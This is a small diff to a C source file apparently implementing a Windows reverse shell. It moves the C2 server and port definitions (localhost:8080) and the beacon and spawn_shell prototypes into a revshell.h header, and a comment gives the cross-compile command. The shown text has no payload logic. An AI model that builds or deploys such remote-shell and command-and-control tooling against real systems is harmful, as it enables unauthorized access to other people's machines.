@@ -2,16 +2,9 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
+#include "revshell.h"
 
 /* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */
-
-/* --- C2 connection properties --- */
-#define C2PORT 8080
-#define C2SERVER "localhost"
-
-/* prototypes */
-static void beacon();
-static void spawn_shell(SOCKET sock_pipe);
 
 int main(int argc, char* argv[])
 {
